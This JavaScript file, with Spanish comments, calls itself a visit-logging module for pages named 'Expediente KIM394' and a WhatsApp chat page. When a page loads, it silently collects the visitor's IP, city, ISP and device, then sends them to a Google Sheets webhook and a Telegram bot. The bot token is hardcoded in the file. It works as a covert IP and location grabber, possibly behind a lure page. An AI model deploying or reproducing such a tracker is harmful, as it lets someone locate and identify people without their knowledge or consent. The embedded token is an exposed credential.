/**
 * KIM394 — Módulo de Registro de Visitas y Auditoría (Google Sheets & Telegram)
 * Registra fecha, hora, página, dirección IP, ciudad, proveedor y dispositivo.
 */

(function() {
  'use strict';

  // ─── Configuración ──────────────────────────────────────────
  const GOOGLE_SHEETS_WEBHOOK = 'https://script.google.com/macros/s/AKfycbzRIUIXFCOM-dntI5eS-qwbDqS7-jxYwhYfcmBOQRToHGL86LR52iD08R3emA-a9N3ZRQ/exec';
  
  // Credenciales de Telegram
  const TELEGRAM_BOT_TOKEN = '8823324058:AAFJq0l22ehzjFkqSXi9yXjuusAwPwO3qUk';
  const TELEGRAM_CHAT_ID   = '981503051';

  // ─── Identificación de Página ───────────────────────────────
  const pagePath = window.location.pathname.split('/').pop() || 'index.html';
  const pageName = pagePath.indexOf('whatsapp') !== -1 ? 'WhatsApp Chat (whatsapp.html)' : 'Portada Expediente (index.html)';

  // Evitar duplicados inmediatos en la misma pestaña
  const sessionKey = 'kim394_tracked_' + pagePath;
  if (sessionStorage.getItem(sessionKey)) {
    return; // Ya registrado en esta sesión
  }

  // ─── Detección de Dispositivo ───────────────────────────────
  function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Computadora de Escritorio';
    if (/iPad|Tablet/i.test(ua)) device = 'Tablet';
    else if (/Mobi|Android|iPhone/i.test(ua)) device = 'Celular / Smartphone';

    let browser = 'Desconocido';
    if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
    else if (ua.indexOf('Edg') !== -1) browser = 'Edge';
    else if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';

    return `${device} (${browser})`;
  }

  // ─── Envío a Google Sheets ──────────────────────────────────
  function sendToGoogleSheets(data) {
    if (!GOOGLE_SHEETS_WEBHOOK) return;
    try {
      const params = new URLSearchParams({
        fecha: data.fecha || '',
        pagina: data.pagina || '',
        ip: data.ip || '',
        ciudad: data.ciudad || '',
        region: data.region || '',
        pais: data.pais || '',
        isp: data.isp || '',
        user_agent: data.user_agent || ''
      });
      const url = GOOGLE_SHEETS_WEBHOOK + '?' + params.toString();
      fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
    } catch (e) {
      // Silencioso
    }
  }

  // ─── Envío a Telegram ───────────────────────────────────────
  function sendToTelegram(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

    const message = 
      `🔔 *Nueva visita al Expediente KIM394*\n\n` +
      `📄 *Página:* ${data.pagina}\n` +
      `🌐 *IP:* \`${data.ip}\`\n` +
      `📍 *Ubicación:* ${data.ciudad}, ${data.region} (${data.pais})\n` +
      `🏢 *Proveedor:* ${data.isp}\n` +
      `📱 *Dispositivo:* ${data.user_agent}\n` +
      `⏰ *Fecha y hora:* ${data.fecha}`;

    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      }).catch(err => console.debug('Telegram notify:', err));
    } catch (e) {
      // Silencioso
    }
  }

  // ─── Obtener Datos de IP y Registrar ────────────────────────
  function trackVisitor() {
    const now = new Date();
    const fechaHora = now.toLocaleString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
    const deviceInfo = getDeviceInfo();

    // Consultar servicio público de geolocalización IP
    fetch('https://ipapi.co/json/')
      .then(res => {
        if (!res.ok) throw new Error('ipapi failed');
        return res.json();
      })
      .then(ipData => {
        const payload = {
          fecha: fechaHora,
          pagina: pageName,
          ip: ipData.ip || 'Desconocida',
          ciudad: ipData.city || 'Desconocida',
          region: ipData.region || 'Desconocida',
          pais: ipData.country_name || 'Argentina',
          isp: ipData.org || ipData.asn || 'Proveedor local',
          user_agent: deviceInfo
        };

        sendToGoogleSheets(payload);
        sendToTelegram(payload);
        sessionStorage.setItem(sessionKey, 'true');
      })
      .catch(() => {
        // Fallback básico si el proveedor de geolocalización estuviera bloqueado
        fetch('https://api.ipify.org?format=json')
          .then(r => r.json())
          .then(simpleIp => {
            const payload = {
              fecha: fechaHora,
              pagina: pageName,
              ip: simpleIp.ip || 'Desconocida',
              ciudad: 'Comodoro Rivadavia / Región',
              region: 'Chubut',
              pais: 'Argentina',
              isp: '-',
              user_agent: deviceInfo
            };
            sendToGoogleSheets(payload);
            sendToTelegram(payload);
            sessionStorage.setItem(sessionKey, 'true');
          })
          .catch(() => {
            // Registro mínimo con User-Agent
            const payload = {
              fecha: fechaHora,
              pagina: pageName,
              ip: 'IP Oculta por Navegador',
              ciudad: '-',
              region: '-',
              pais: '-',
              isp: '-',
              user_agent: deviceInfo
            };
            sendToGoogleSheets(payload);
            sendToTelegram(payload);
            sessionStorage.setItem(sessionKey, 'true');
          });
      });
  }

  // Iniciar al cargar la página
  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(trackVisitor, 800);
  } else {
    document.addEventListener('DOMContentLoaded', () => setTimeout(trackVisitor, 800));
  }

})();
